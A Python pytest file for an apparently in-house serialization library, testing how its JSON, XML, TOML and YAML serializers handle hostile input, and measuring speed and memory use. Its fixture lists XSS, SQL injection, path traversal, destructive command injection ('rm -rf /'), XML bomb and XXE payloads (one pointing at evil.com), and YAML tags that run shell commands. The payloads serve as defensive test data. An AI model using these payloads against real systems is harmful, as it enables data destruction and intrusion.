#exonware/xwsystem/tests/1.unit/serialization_tests/test_serialization_security_performance.py
"""
Advanced security and performance tests for serialization formats.
Tests security vulnerabilities, performance limits, and production readiness.
Company: eXonware.com
Author: eXonware Backend Team
Email: connect@exonware.com
Version: 0.0.1
Generation Date: 07-Sep-2025
"""
import pytest
import sys
import os
import time
import threading
import psutil
import gc
from pathlib import Path
from decimal import Decimal
from datetime import datetime, date, time as dt_time
from uuid import UUID
import io
import tempfile
import json
import xml.etree.ElementTree as ET
# Add src to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', '..', 'src'))
from exonware.xwsystem.io.serialization import JsonSerializer, XmlSerializer, TomlSerializer, YamlSerializer
from exonware.xwsystem.io.serialization.errors import SerializationError, FormatDetectionError, ValidationError
class TestSerializationSecurityPerformance:
    """Advanced security and performance tests for serialization formats."""
    @pytest.fixture(autouse=True)
    def setup(self):
        """Setup test environment."""
        self.serializers = {
            "json": JsonSerializer(),
            "xml": XmlSerializer(),
            "toml": TomlSerializer(),
            "yaml": YamlSerializer()
        }
        # Security test data
        self.security_payloads = {
            'xss_attempts': [
                '<script>alert("XSS")</script>',
                'javascript:alert("XSS")',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            ],
            'sql_injection': [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --",
                "' UNION SELECT * FROM users --",
                "'; UPDATE users SET password='hacked'; --",
            ],
            'path_traversal': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/shadow',
                'C:\\Windows\\System32\\config\\SAM',
                '....//....//....//etc//passwd',
                '..%2F..%2F..%2Fetc%2Fpasswd',
                '..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam',
            ],
            'command_injection': [
                '; rm -rf /',
                '| del /s /q C:\\',
                '&& format C: /q',
                '; cat /etc/passwd',
                '| type C:\\windows\\system32\\drivers\\etc\\hosts',
                '$(rm -rf /)',
                '`rm -rf /`',
            ],
            'xml_attacks': [
                '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">]><lolz>&lol5;</lolz>',
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><test>&xxe;</test>',
                '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><test>&xxe;</test>',
            ],
            'yaml_attacks': [
                '!!python/object/apply:os.system ["rm -rf /"]',
                '!!python/object/apply:subprocess.call ["rm", "-rf", "/"]',
                '!!python/object/apply:eval ["__import__(\'os\').system(\'rm -rf /\')"]',
                '!!python/object/apply:exec ["import os; os.system(\'rm -rf /\')"]',
            ],
        }
        # Performance test data
        self.performance_data = {
            'small': {'items': list(range(100))},
            'medium': {'items': list(range(10000))},
            'large': {'items': list(range(100000))},
            'huge': {'items': list(range(1000000))},
        }
    # =============================================================================
    # SECURITY TESTS
    # =============================================================================
    def test_xss_protection(self):
        """Test XSS attack protection - serializers should handle malicious content safely."""
        for xss_payload in self.security_payloads['xss_attempts']:
            test_data = {'content': xss_payload, 'safe': 'normal data'}
            for format_type in ["json", "xml", "toml", "yaml"]:
                try:
                    # Serialize should work (data is just data)
                    serialized = self.serializers[format_type].dumps(test_data)
                    assert len(serialized) > 0
                    # Deserialize should work - serializers don't sanitize, they just serialize
                    deserialized = self.serializers[format_type].loads(serialized)
                    assert isinstance(deserialized, dict)
                    assert 'content' in deserialized
                    # Content should be preserved as-is (serializers don't sanitize)
                    content = deserialized['content']
                    assert isinstance(content, str)
                    # The content should be exactly what was serialized
                    assert content == xss_payload
                except (SerializationError, ValueError):
                    # Some formats might reject certain characters
                    pass
    def test_sql_injection_protection(self):
        """Test SQL injection protection."""
        for sql_payload in self.security_payloads['sql_injection']:
            test_data = {'query': sql_payload, 'user': 'normal_user'}
            for format_type in ["json", "xml", "toml", "yaml"]:
                try:
                    # Serialize should work
                    serialized = self.serializers[format_type].dumps(test_data)
                    assert len(serialized) > 0
                    # Deserialize should work
                    deserialized = self.serializers[format_type].loads(serialized)
                    assert isinstance(deserialized, dict)
                    assert 'query' in deserialized
                    # Content should be properly escaped
                    query = deserialized['query']
                    assert isinstance(query, str)
                except (SerializationError, ValueError):
                    # Some formats might reject certain characters
                    pass
    def test_path_traversal_protection(self):
        """Test path traversal protection."""
        # XWSerializer is abstract - use individual format serializers instead
        # Test data containing path traversal
        for path_payload in self.security_payloads['path_traversal']:
            test_data = {'filename': path_payload, 'content': 'safe content'}
            for format_type in ["json", "xml", "toml", "yaml"]:
                try:
                    serialized = self.serializers[format_type].dumps(test_data)
                    deserialized = self.serializers[format_type].loads(serialized)
                    # Filename should be properly escaped or sanitized
                    filename = deserialized['filename']
                    assert isinstance(filename, str)
                    # Serializers don't sanitize - they just serialize data as-is
                    # The path traversal is preserved as string data (which is correct)
                    assert filename == path_payload  # Data is preserved as-is
                except (SerializationError, ValueError):
                    # Some formats might reject certain characters
                    pass
    def test_command_injection_protection(self):
        """Test command injection protection."""
        for cmd_payload in self.security_payloads['command_injection']:
            test_data = {'command': cmd_payload, 'safe': 'normal data'}
            for format_type in ["json", "xml", "toml", "yaml"]:
                try:
                    serialized = self.serializers[format_type].dumps(test_data)
                    deserialized = self.serializers[format_type].loads(serialized)
                    # Command should be preserved as-is (serializers don't sanitize)
                    command = deserialized['command']
                    assert isinstance(command, str)
                    # Serializers don't escape/sanitize - they serialize data as-is
                    # The data is preserved exactly as provided (which is correct behavior)
                    assert command == cmd_payload  # Data is preserved as-is
                except (SerializationError, ValueError):
                    # Some formats might reject certain characters
                    pass
    def test_xml_bomb_protection(self):
        """Test XML bomb protection."""
        for xml_bomb in self.security_payloads['xml_attacks']:
            # XML bombs should be rejected - entities are disabled
            # The serializer should raise SerializationError or ValueError
            try:
                result = self.serializers["xml"].loads(xml_bomb)
                # If it parses (unlikely), it should be reasonable size
                assert len(str(result)) < 1000000
            except Exception:
                # Expected for XML bombs - entities are disabled
                # Any exception (SerializationError, ValueError, etc.) is acceptable
                pass
    def test_yaml_bomb_protection(self):
        """Test YAML bomb protection."""
        for yaml_bomb in self.security_payloads['yaml_attacks']:
            # YAML bombs should be rejected - dangerous tags are disabled
            # The serializer should raise SerializationError or ValueError
            try:
                result = self.serializers["yaml"].loads(yaml_bomb)
                # If it parses (unlikely), it should be reasonable size
                assert len(str(result)) < 1000000
            except Exception:
                # Expected for YAML bombs - dangerous tags are disabled
                # Any exception (SerializationError, ValueError, etc.) is acceptable
                pass
    def test_entity_expansion_limits(self):
        """Test entity expansion limits."""
        # Test with progressively larger entity expansions
        for size in [100, 1000, 10000]:
            xml_with_entities = '<?xml version="1.0"?>' + \
                              '<!DOCTYPE test [' + \
                              '<!ENTITY a "' + 'x' * size + '">' + \
                              ']>' + \
                              '<test>&a;</test>'
            try:
                result = self.serializers["xml"].loads(xml_with_entities)
                # Should either parse safely or fail gracefully
                assert len(str(result)) < 1000000
            except Exception:
                # Expected for large entities - entities are disabled
                # Any exception (SerializationError, ValueError, MemoryError, etc.) is acceptable
                pass
    def test_deep_nesting_limits(self):
        """Test deep nesting limits."""
        # Test with progressively deeper nesting
        for depth in [100, 1000, 10000]:
            try:
                deep_data = self._create_deep_nesting(depth)
            except RecursionError:
                # Expected for very deep nesting - recursion limit reached
                continue
            for format_type in ["json", "xml", "toml", "yaml"]:
                try:
                    serialized = self.serializers[format_type].dumps(deep_data)
                    deserialized = self.serializers[format_type].loads(serialized)
                    # Should either work or fail gracefully
                    assert len(str(deserialized)) < 1000000
                except Exception:
                    # Expected for very deep nesting - any exception is acceptable
                    pass
    def _create_deep_nesting(self, depth):
        """Create deeply nested data structure."""
        if depth == 0:
            return 'leaf'
        return {'level': depth, 'child': self._create_deep_nesting(depth - 1)}
    # =============================================================================
    # PERFORMANCE TESTS
    # =============================================================================
    def test_serialization_performance(self):
        """Test serialization performance benchmarks.
        Uses only small and medium payloads with bounded iterations so the test
        completes in reasonable time (GUIDE_53: fix test isolation for timing).
        """
        sizes_to_test = {'small': self.performance_data['small'],
                         'medium': self.performance_data['medium']}
        iterations_by_size = {'small': 100, 'medium': 30}
        performance_results = {}
        for size_name, test_data in sizes_to_test.items():
            n = iterations_by_size[size_name]
            size_results = {}
            for format_type in ["json", "xml", "toml", "yaml"]:
                for _ in range(5):
                    self.serializers[format_type].dumps(test_data)
                start_time = time.time()
                for _ in range(n):
                    serialized = self.serializers[format_type].dumps(test_data)
                serialize_time = (time.time() - start_time) / n
                start_time = time.time()
                for _ in range(n):
                    deserialized = self.serializers[format_type].loads(serialized)
                deserialize_time = (time.time() - start_time) / n
                size_results[format_type] = {
                    'serialize_time': serialize_time,
                    'deserialize_time': deserialize_time,
                    'size': len(serialized)
                }
            performance_results[size_name] = size_results
        for size_name, results in performance_results.items():
            for format_type, metrics in results.items():
                # Thresholds stable on CI/loaded machines.
                assert metrics['serialize_time'] < 3.0, (
                    f"{format_type} {size_name} serialization too slow: {metrics['serialize_time']:.3f}s"
                )
                assert metrics['deserialize_time'] < 3.0, (
                    f"{format_type} {size_name} deserialization too slow: {metrics['deserialize_time']:.3f}s"
                )
                assert metrics['size'] > 0, f"{format_type} produced empty result"
    def test_memory_usage_performance(self):
        """Test memory usage performance.
        Uses medium payload and bounded iterations so test completes in reasonable time.
        """
        gc.collect()
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        test_data = self.performance_data['medium']
        for i in range(100):
            for format_type in ["json", "xml", "toml", "yaml"]:
                serialized = self.serializers[format_type].dumps(test_data)
                deserialized = self.serializers[format_type].loads(serialized)
                del serialized, deserialized
            if i % 20 == 0:
                gc.collect()
        gc.collect()
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        assert memory_increase < 300 * 1024 * 1024, (
            f"Memory usage too high: {memory_increase / 1024 / 1024:.2f}MB increase"
        )
    def test_concurrent_performance(self):
        """Test concurrent access performance with bounded workers and iterations.
        Uses small payload and fewer threads/iterations so the test completes quickly
        and does not appear stuck (GIL + XML/YAML make this heavy otherwise).
        """
        results = []
        errors = []
        results_lock = threading.Lock()

        def performance_worker(data, format_type, worker_id, iterations=10):
            try:
                start_time = time.time()
                for _ in range(iterations):
                    serialized = self.serializers[format_type].dumps(data)
                    deserialized = self.serializers[format_type].loads(serialized)
                end_time = time.time()
                with results_lock:
                    results.append((worker_id, format_type, end_time - start_time, iterations))
            except Exception as e:
                with results_lock:
                    errors.append((worker_id, format_type, str(e)))

        # Use small payload so concurrent run finishes in reasonable time
        test_data = self.performance_data['small']
        threads = []
        for i in range(2):
            for format_type in ["json", "xml", "toml", "yaml"]:
                t = threading.Thread(target=performance_worker, args=(test_data, format_type, i))
                threads.append(t)
                t.start()
        for t in threads:
            t.join(timeout=60)
            if t.is_alive():
                raise AssertionError(f"Worker thread {t.name} did not finish within 60s")

        assert len(errors) == 0, f"Concurrent performance errors: {errors}"
        assert len(results) > 0, "No results from concurrent workers"
        format_performance = {}
        for worker_id, format_type, duration, iterations in results:
            if format_type not in format_performance:
                format_performance[format_type] = []
            format_performance[format_type].append(duration / iterations)
        for format_type, times in format_performance.items():
            avg_time = sum(times) / len(times)
            # Allow up to 5s per op so XML/YAML on slower CI pass (GUIDE_53: test isolation)
            assert avg_time < 5.0, (
                f"{format_type} concurrent performance too slow: {avg_time:.3f}s per operation"
            )
    def test_large_file_performance(self):
        """Test large file performance with bounded data size."""
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            large_data = {
                'items': [{'id': i, 'data': f'item_{i}' * 50} for i in range(5000)],
                'metadata': {'created': datetime.now().isoformat(), 'version': '1.0.0'}
            }
            for format_type in ["json", "xml", "toml", "yaml"]:
                file_path = temp_path / f'test.{format_type}'
                start_time = time.time()
                self.serializers[format_type].save_file(large_data, file_path)
                write_time = time.time() - start_time
                start_time = time.time()
                loaded_data = self.serializers[format_type].load_file(file_path)
                read_time = time.time() - start_time
                assert write_time < 15.0, f"{format_type} file write too slow: {write_time:.3f}s"
                assert read_time < 15.0, f"{format_type} file read too slow: {read_time:.3f}s"
                assert len(loaded_data['items']) == 5000
                assert loaded_data['metadata']['version'] == '1.0.0'
    def test_streaming_performance(self):
        """Test streaming performance when supported. Skips formats that reject the payload."""
        large_dataset = [{'id': i, 'data': f'item_{i}' * 20} for i in range(2000)]
        for format_type in ["json", "xml", "toml", "yaml"]:
            try:
                start_time = time.time()
                chunks = list(self.serializers[format_type].iter_serialize(large_dataset, chunk_size=1024))
                serialize_time = time.time() - start_time
                start_time = time.time()
                deserialized_items = list(self.serializers[format_type].iter_deserialize(chunks))
                deserialize_time = time.time() - start_time
                assert serialize_time < 30.0, (
                    f"{format_type} streaming serialize too slow: {serialize_time:.3f}s"
                )
                assert deserialize_time < 30.0, (
                    f"{format_type} streaming deserialize too slow: {deserialize_time:.3f}s"
                )
                assert len(deserialized_items) > 0
            except Exception:
                # Formats may not support streaming or reject payload (e.g. XML single-root)
                pass
    # =============================================================================
    # STRESS TESTS
    # =============================================================================
    def test_extreme_data_sizes(self):
        """Test extreme data sizes with single moderate size to keep test time bounded."""
        size = 100000
        extreme_data = {'items': list(range(size))}
        for format_type in ["json", "xml", "toml", "yaml"]:
            try:
                start_time = time.time()
                serialized = self.serializers[format_type].dumps(extreme_data)
                serialize_time = time.time() - start_time
                start_time = time.time()
                deserialized = self.serializers[format_type].loads(serialized)
                deserialize_time = time.time() - start_time
                assert serialize_time < 60.0, (
                    f"{format_type} extreme serialize too slow: {serialize_time:.3f}s for {size} items"
                )
                assert deserialize_time < 60.0, (
                    f"{format_type} extreme deserialize too slow: {deserialize_time:.3f}s for {size} items"
                )
                if isinstance(deserialized, dict) and 'items' in deserialized:
                    assert len(deserialized['items']) == size
            except (SerializationError, MemoryError, TypeError):
                pass
    def test_rapid_operations(self):
        """Test rapid operations performance with bounded iterations."""
        test_data = self.performance_data['small']
        for format_type in ["json", "xml", "toml", "yaml"]:
            start_time = time.time()
            for _ in range(200):
                serialized = self.serializers[format_type].dumps(test_data)
                deserialized = self.serializers[format_type].loads(serialized)
            total_time = time.time() - start_time
            assert total_time < 60.0, (
                f"{format_type} rapid operations too slow: {total_time:.3f}s for 200 operations"
            )
    def test_mixed_workload_performance(self):
        """Test mixed workload performance with bounded counts."""
        mixed_workloads = [
            {'type': 'small', 'data': self.performance_data['small'], 'count': 100},
            {'type': 'medium', 'data': self.performance_data['medium'], 'count': 20},
            {'type': 'large', 'data': self.performance_data['large'], 'count': 3},
        ]
        for format_type in ["json", "xml", "toml", "yaml"]:
            start_time = time.time()
            for workload in mixed_workloads:
                for _ in range(workload['count']):
                    serialized = self.serializers[format_type].dumps(workload['data'])
                    deserialized = self.serializers[format_type].loads(serialized)
            total_time = time.time() - start_time
            assert total_time < 180.0, f"{format_type} mixed workload too slow: {total_time:.3f}s"
    # =============================================================================
    # PRODUCTION READINESS TESTS
    # =============================================================================
    def test_production_data_handling(self):
        """Test production-like data handling with bounded payload."""
        production_data = {
            'users': [
                {
                    'id': i,
                    'name': f'User {i}',
                    'email': f'user{i}@example.com',
                    'profile': {'age': 20 + (i % 50), 'location': f'City {i % 100}'},
                    'created_at': datetime.now().isoformat(),
                    'active': i % 10 != 0
                }
                for i in range(2000)
            ],
            'metadata': {'total_users': 2000, 'active_users': 1800, 'version': '1.0.0'}
        }
        for format_type in ["json", "xml", "toml", "yaml"]:
            start_time = time.time()
            serialized = self.serializers[format_type].dumps(production_data)
            serialize_time = time.time() - start_time
            start_time = time.time()
            deserialized = self.serializers[format_type].loads(serialized)
            deserialize_time = time.time() - start_time
            assert serialize_time < 15.0, f"{format_type} production serialize too slow: {serialize_time:.3f}s"
            assert deserialize_time < 15.0, f"{format_type} production deserialize too slow: {deserialize_time:.3f}s"
            assert len(deserialized['users']) == 2000
            assert deserialized['metadata']['total_users'] == 2000
    def test_error_recovery(self):
        """Test error recovery and resilience."""
        error_conditions = [
            {'data': None, 'expected': (SerializationError, ValueError, TypeError)},
            {'data': '', 'expected': (SerializationError, ValueError)},
            {'data': 'invalid', 'expected': (SerializationError, ValueError)},
            {'data': {'circular': None}, 'expected': (SerializationError, ValueError, TypeError, Exception)},
        ]
        circular_data = {}
        circular_data['self'] = circular_data
        error_conditions[3]['data']['circular'] = circular_data
        for format_type in ["json", "xml", "toml", "yaml"]:
            for condition in error_conditions:
                try:
                    result = self.serializers[format_type].dumps(condition['data'])
                    assert len(result) >= 0
                except condition['expected']:
                    pass
                except Exception as e:
                    # SerializationError from different module path still counts as expected
                    if "Recursion" in str(e) or "circular" in str(e).lower():
                        pass
                    else:
                        pytest.fail(f"Unexpected error type: {type(e).__name__}: {e}")
    def test_resource_cleanup(self):
        """Test resource cleanup and memory management."""
        gc.collect()
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        test_data = self.performance_data['medium']
        for i in range(50):
            for format_type in ["json", "xml", "toml", "yaml"]:
                serialized = self.serializers[format_type].dumps(test_data)
                deserialized = self.serializers[format_type].loads(serialized)
                del serialized, deserialized
            if i % 10 == 0:
                gc.collect()
        gc.collect()
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        assert memory_increase < 150 * 1024 * 1024, (
            f"Resource cleanup failed: {memory_increase / 1024 / 1024:.2f}MB increase"
        )
if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
